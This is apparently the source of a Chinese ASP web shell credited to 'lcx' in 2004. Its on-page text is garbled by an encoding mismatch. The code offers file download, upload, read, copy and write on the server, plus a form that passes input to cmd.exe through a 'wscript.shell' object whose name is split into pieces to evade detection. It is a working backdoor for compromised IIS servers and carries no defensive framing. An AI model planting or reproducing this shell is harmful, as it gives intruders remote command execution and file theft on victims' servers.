<%@codepage=936%>
<%
If Err.Number=-2147221005 Then 
        Response.Write "<div align='center'>�ǳ��ź�,����������֧��ADODB.Stream,����ʹ�ñ�����</div>"
        Err.Clear
        Response.End
end if%>
<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                %>
<table border=0 width=100% align="left" cellspacing="0" cellpadding="0"> <%=FN%> �ϴ���: <%=session("lp")%>[<a href=# onclick=history.back()>�����ϴ�</a>]<br></table></body>
<%else
on error resume next
if session("lp")="" then
session("lp")=server.mappath(".")
else
session("lp")=Request("h")
end if%>
<%'�����ļ�
function dl(f,n)
on error resume next
Set S=CreateObject("Adodb.Stream") 
S.Mode=3 
S.Type=1 
S.Open 
S.LoadFromFile(f)
if Err.Number>0 then 
Response.Status="404"
else
Response.ContentType="application/octet-stream"
Response.AddHeader "Content-Disposition:","attachment;filename=" & n
Range=Mid(Request.ServerVariables("HTTP_RANGE"),7)
if Range="" then
Response.BinaryWrite(S.Read)
else
S.position=Clng(Split(Range,"-")(0))
Response.BinaryWrite(S.Read)
End if
end if
Response.End
end function
if request.form("down")="down" then 
f=request.form("f")
n=request.form("n")
call dl(f,n)
end if
%>
<form name=down method=post action="">
<input name=f type=text value=Դ�ļ������ַ>
<input name=n type=text value=������ļ���>
<input name=down value=down type=submit>
</form>
<script language="javascript">function check(){if(kk.file1.value==""){alert("��ѡ���ϴ����ļ���");return false;}}</script>
<form name=kk enctype=multipart/form-data method=post action=?up=1 onsubmit="return check();">
<table border=0 width=100% align=left valign=top cellpadding=0 cellspacing=0>
<tr><td><br><input type=file name=file1> <input type=submit name=upload value=�ϴ���:<%=session("lp")%>></form>
<form method=POST>�ϴ�:<input type=text name=h value=<%=session("lp")%>><input type=submit value=����></form>
<%end if%>
<%
'���ļ�
function readfile(URL,chartype)
set srmObj = server.CreateObject("adodb.stream")
url=request.form("name")
srmObj.type=1
srmObj.mode=3
srmObj.open
srmObj.Position=0
srmObj.LoadFromFile URL
srmObj.Position = 0
srmObj.type=2
srmObj.charset=chartype
readfile=srmObj.readtext()
end function
if request.form("name")<>"" and request.form("name")<>"Ҫ�����ļ������ַ" and request.form("ok")="read-copy-ren-write" then
response.write "<hr><pre>" & Server.HTMLEncode(readfile(url,"gb2312"))&"<hr>"
end if
%>
<%'���Ʋ�����
On Error Resume Next
file1 = Request("file1")
file2 = Request("file2")
Set objStream = Server.CreateObject("ADODB.Stream")
objStream.Type = 1 ' adTypeBinary
objStream.Open
objStream.LoadFromFile file1
objStream.SaveToFile file2,2
%>
<% 'д�ļ�
on error resume next 
set lcx=server.CreateObject("Adodb.Stream") 
lcx.Open 
lcx.Type=2 
lcx.CharSet="gb2312" 
lcx.LoadFromFile request.form("save")
lcx.Position=lcx.Size 
lcx.writetext request.form("text")
lcx.SaveToFile request.form("save"),2 
lcx.Close 
set lcx=nothing 
%> 
<form action="" method=post>
<input type=text name=name value="��ǰ�ļ���ַ��<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>">
<input type=text name=file1 value="Ҫcopy��Դ�ļ������ַ"><input type=text name=file2 value="Ŀ�ص�ַ�ļ����Ը���">
<input type=text name=save value="д����ļ�ȫ��">
<textarea name=text>�ļ�����</textarea>
<input type=submit name=ok value="read-copy-ren-write">
</form>
<%'���������֧��wscript.shell������뽫���´���ȫ��ɾȥ%>
<form method="post">
<input type=text name="cmd" size=60>
<input type=submit value="cmd"></form>
<textarea readonly cols=80 rows=20>
<%response.write server.createobject("ws"+"cr"+"ipt.s"+"hell").exec("c"+"md.exe /c "&request.form("cmd")).stdout.readall%>
</textarea>
</td></tr></table>
<br>
<CENTER><font color=red>���汾����cmd�����õ���wscript.shell�⣬����ȫ����adodb.streamд�� by lcx 2004��10��13��</font><br></center>
